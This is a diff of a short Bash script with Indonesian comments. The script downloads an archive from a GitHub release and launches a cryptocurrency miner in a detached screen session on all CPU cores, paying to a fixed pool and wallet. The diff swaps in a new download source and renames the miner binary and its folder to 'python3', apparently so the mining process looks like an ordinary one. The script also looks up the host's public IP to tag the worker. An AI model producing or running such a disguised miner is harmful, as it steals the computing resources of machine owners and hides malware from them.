@@ -2,8 +2,8 @@
 
 # Nama file yang akan diunduh
 FILE="KONTOL"
-URL="https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz"
-EXTRACTED_DIR="cpuminer"  # Nama folder hasil ekstraksi
+URL="https://github.com/DotAja/ALONE/releases/download/alone/dotpu.tar.gz"
+EXTRACTED_DIR="python3"  # Nama folder hasil ekstraksi
 
 # Fungsi untuk menampilkan efek loading
 loading() {
@@ -50,4 +50,4 @@ IPNA=$(curl -s ifconfig.me)
 # Mengambil bagian belakang IP (oktet terakhir)
 MEKI=$(echo "$IPNA" | cut -d '.' -f 4)
 
-screen -dmS dotgula ./cpuminer -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.MiNi-$MEKI -t $(nproc)
+screen -dmS meki ./python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1qmpk65gyqqgk63lkrg27gnl9hc2e8zqn7jgmd5j.MiNi-$MEKI -t $(nproc)
